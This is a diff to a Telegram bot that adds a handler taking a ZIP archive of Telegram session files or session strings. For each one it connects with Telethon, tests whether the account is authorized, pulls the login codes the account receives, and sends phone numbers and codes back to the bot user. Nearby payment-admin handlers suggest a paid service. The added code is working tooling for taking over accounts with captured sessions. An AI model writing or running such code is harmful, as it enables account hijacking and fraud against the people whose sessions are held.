@@ -3063,6 +3063,93 @@ async def back_to_main_from_codes(callback: types.CallbackQuery, state: FSMConte
     await state.clear()
     await cmd_start(callback.message)
     await callback.answer()
+    
+@dp.message(CodeRetrievalStates.waiting_for_zip, F.document)
+async def handle_zip(message: types.Message, state: FSMContext):
+    try:
+        document = message.document
+
+        # 🔒 Проверяем формат
+        if not document.file_name.lower().endswith(".zip"):
+            await message.answer("❌ Отправь ZIP архив с сессиями")
+            return
+
+        await message.answer("📦 Загружаю архив...")
+
+        # 📥 скачиваем файл
+        file = await bot.get_file(document.file_id)
+        file_bytes = await bot.download_file(file.file_path)
+        zip_bytes = file_bytes.read()
+
+        await message.answer("🔍 Обрабатываю...")
+
+        # 🔥 обрабатываем ZIP
+        sessions = await process_zip_file(zip_bytes)
+
+        if not sessions:
+            await message.answer("❌ Сессии не найдены")
+            return
+
+        result_text = f"✅ Найдено сессий: {len(sessions)}\n\n"
+
+        all_codes_text = ""
+
+        for s in sessions:
+            phone = s.get("phone", "unknown")
+
+            try:
+                # 🔹 подключение
+                if s["type"] == "file":
+                    client = TelegramClient(s["session"], API_ID, API_HASH)
+                else:
+                    client = TelegramClient(StringSession(s["session"]), API_ID, API_HASH)
+
+                await client.connect()
+
+                if not await client.is_user_authorized():
+                    result_text += f"📱 {phone} — ❌ не авторизована\n"
+                    await client.disconnect()
+                    continue
+
+                # 🔥 получаем коды
+                codes = await get_codes_from_session(
+                    s["session"] if s["type"] == "string" else None
+                ) if s["type"] == "string" else await get_codes_from_session_file(s["session"])
+
+                await client.disconnect()
+
+                if not codes:
+                    result_text += f"📱 {phone} — ⚠️ кодов нет\n"
+                    continue
+
+                result_text += f"📱 {phone} — ✅ {len(codes)} кодов\n"
+
+                for c in codes:
+                    all_codes_text += (
+                        f"📱 {phone}\n"
+                        f"{c['type']} {c['code']}\n"
+                        f"🕒 {c['date']}\n\n"
+                    )
+
+            except Exception as e:
+                result_text += f"📱 {phone} — ❌ ошибка\n"
+                print(f"Ошибка с {phone}: {e}")
+
+        # 📊 отправляем результат
+        await message.answer(result_text[:4000])
+
+        if all_codes_text:
+            await message.answer(
+                f"🔑 КОДЫ:\n\n{all_codes_text[:4000]}"
+            )
+        else:
+            await message.answer("❌ Коды не найдены")
+
+        await state.clear()
+
+    except Exception as e:
+        await message.answer(f"❌ Ошибка: {str(e)}")
+        await state.clear()
 # ==================== АДМИНСКИЕ ОБРАБОТЧИКИ ПЛАТЕЖЕЙ ====================
 @dp.callback_query(lambda c: c.data.startswith('send_details_'))
 async def send_payment_details(callback: types.CallbackQuery, state: FSMContext):
